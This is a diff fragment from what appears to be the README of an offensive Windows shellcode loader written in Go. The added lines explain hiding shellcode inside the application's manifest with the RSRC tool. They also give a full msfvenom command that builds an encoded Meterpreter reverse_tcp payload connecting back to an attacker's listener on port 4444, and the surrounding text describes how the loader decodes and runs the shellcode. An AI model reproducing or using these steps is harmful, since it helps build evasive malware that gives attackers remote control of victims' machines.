@@ -17,7 +17,12 @@ This code loads shellcode embedded within the application’s resources, decodes
 
 6- Execution Wait: NtWaitForSingleObject is used to wait indefinitely for the shellcode to execute in the new thread.
 
+We will use a technique of exploiting the manifest files using the RSRC tool.
+What is a manifest file? --> It is an XML file that provides information. We will take advantage of this file to leave our shellcode.
+
 ## Instructions
+Create shellcode --> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=eth0 lport=4444 EnableStageEncoding=true StageEncoder=x64/xor_dynamic EXITFUNC=thread -f hex
+
 Install 2 libraries : go get "golang.org/x/sys/windows" and go get "github.com/ASP4RUX/Hades/pkg/Hades"
 
 Install RSRC --> go install github.com/akavel/rsrc@latest
